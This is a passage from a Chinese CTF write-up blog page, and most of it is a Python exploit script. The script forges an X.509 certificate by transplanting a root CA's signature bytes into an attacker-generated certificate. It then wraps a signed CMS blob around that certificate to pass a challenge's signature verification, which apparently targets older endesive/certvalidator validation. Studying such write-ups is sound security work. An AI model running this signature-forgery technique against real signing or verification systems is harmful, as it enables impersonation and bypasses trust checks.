class="literal">True</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加 BasicConstraints (CA=True) 以通过潜在的 CA 检查</span></span><br><span class="line">    builder = builder.add_extension(</span><br><span class="line">        x509.BasicConstraints(ca=<span class="literal">True</span>, path_length=<span class="literal">None</span>), critical=<span class="literal">True</span>,</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 签名 (稍后会被替换)</span></span><br><span class="line">    cert = builder.sign(private_key=priv_key, algorithm=hashes.SHA256())</span><br><span class="line">    <span class="keyword">return</span> cert</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># --- 步骤 1: 准备 Root CA 信息 ---</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Loading root.crt...&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;root.crt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        root_data = f.read()</span><br><span class="line">    root_cert = x509.load_pem_x509_certificate(root_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 提取 Root 的原始签名 (用于欺骗 registry.py)</span></span><br><span class="line">    root_signature = root_cert.signature</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Stealing Root Signature (<span class="subst">&#123;<span class="built_in">len</span>(root_signature)&#125;</span> bytes)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 步骤 2: 生成攻击者密钥 ---</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Generating attacker keys...&quot;</span>)</span><br><span class="line">    my_key = rsa.generate_private_key(public_exponent=<span class="number">65537</span>, key_size=<span class="number">2048</span>)</span><br><span class="line">    my_pub = my_key.public_key()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 步骤 3: 创建伪造证书 ---</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Creating fake certificate...&quot;</span>)</span><br><span class="line">    <span class="comment"># 使用与 Root 相同的 Subject/Issuer</span></span><br><span class="line">    fake_cert = create_exploit_cert(root_cert.subject, root_cert.issuer, my_pub, my_key)</span><br><span class="line">    fake_cert_der = fake_cert.public_bytes(serialization.Encoding.DER)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># --- 步骤 4: 执行签名移植 (Signature Transplantation) ---</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Transplanting signature...&quot;</span>)</span><br><span class="line">    fake_signature = fake_cert.signature</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 确保能找到我们要替换的签名部分</span></span><br><span class="line">    <span class="keyword">if</span> fake_signature <span class="keyword">not</span> <span class="keyword">in</span> fake_cert_der:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Error: Could not locate signature bytes in DER. Exploit failed locally.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 替换签名字节</span></span><br><span class="line">    patched_cert_der = fake_cert_der.replace(fake_signature, root_signature)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Signature transplanted successfully.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 步骤 5: 获取题目 Challenge ---</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiving challenge...&quot;</span>)</span><br><span class="line">    data = conn.recvuntil(<span class="string">b&#x27;Your CMS blob&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;&lt;&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to find start marker &#x27;&lt;&lt;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">    hex_str = data.split(<span class="string">&#x27;&lt;&lt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&gt;&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    to_sign_bytes = hex_str.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Signing text: <span class="subst">&#123;to_sign_bytes&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 步骤 6: 签名并构建 CMS ---</span></span><br><span class="line">    <span class="comment"># 使用我们的私钥签名数据 (verifier.py 会用 CMS 里的公钥验签，这步是合法的)</span></span><br><span class="line">    signature = my_key.sign(</span><br><span class="line">        to_sign_bytes,</span><br><span class="line">        padding.PKCS1v15(),</span><br><span class="line">        hashes.SHA256()</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 asn1crypto 构建 CMS 结构</span></span><br><span class="line">    <span class="comment"># 我们需要手动塞入那个“被篡改了签名的证书”</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加载伪造证书对象获取序列号等信息</span></span><br><span class="line">    fake_cert_obj = ax509.Certificate.load(patched_cert_der)</span><br><span class="line">    </span><br><span class="line">    signed_data = cms.SignedData(&#123;</span><br><span class="line">        <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;v1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;digest_algorithms&#x27;</span>: [</span><br><span class="line">            &#123;<span class="string">&#x27;algorithm&#x27;</span>: <span class="string">&#x27;sha256&#x27;</span>, <span class="string">&#x27;parameters&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;encap_content_info&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;content_type&#x27;</span>: <span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;content&#x27;</span>: to_sign_bytes</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;certificates&#x27;</span>: [</span><br><span class="line">            <span class="comment"># 放入被篡改的证书</span></span><br><span class="line">            cms.CertificateChoices.load(patched_cert_der)</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;signer_infos&#x27;</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;v1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;sid&#x27;</span>: cms.IssuerAndSerialNumber(&#123;</span><br><span class="line">                    <span class="string">&#x27;issuer&#x27;</span>: fake_cert_obj.issuer,</span><br><span class="line">                    <span class="string">&#x27;serial_number&#x27;</span>: fake_cert_obj.serial_number</span><br><span class="line">                &#125;),</span><br><span class="line">                <span class="string">&#x27;digest_algorithm&#x27;</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;algorithm&#x27;</span>: <span class="string">&#x27;sha256&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;parameters&#x27;</span>: <span class="literal">None</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&#x27;signature_algorithm&#x27;</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;algorithm&#x27;</span>: <span class="string">&#x27;sha256_rsa&#x27;</span>, </span><br><span class="line">                    <span class="string">&#x27;parameters&#x27;</span>: <span class="literal">None</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="string">&#x27;signature&#x27;</span>: signature</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    content_info = cms.ContentInfo(&#123;</span><br><span class="line">        <span class="string">&#x27;content_type&#x27;</span>: <span class="string">&#x27;signed_data&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;content&#x27;</span>: signed_data</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 步骤 7: 发送 ---</span></span><br><span class="line">    payload = base64.b64encode(content_info.dump())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Sending payload (<span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span> bytes)...&quot;</span>)</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+<p>现在的 <code>endesive</code> 版本已经是 2.19.2 了，对这个版本进行审计发现其已经不使用 <code>certvalidator</code> 了。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AF2025/" rel="prev" title="强网杯2025">
+                  <i class="fa fa-angle-left"></i> 强网杯2025
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">languag3</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" integrity="sha256-UF1fgpAiu3tPJN/uCqEUHNe7pnr+QR0SQDNfgglgtcM=" crossorigin="anonymous">
+  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
+  <script src="/js/third-party/math/katex.js"></script>
+
+
+
+</body>
+</html>
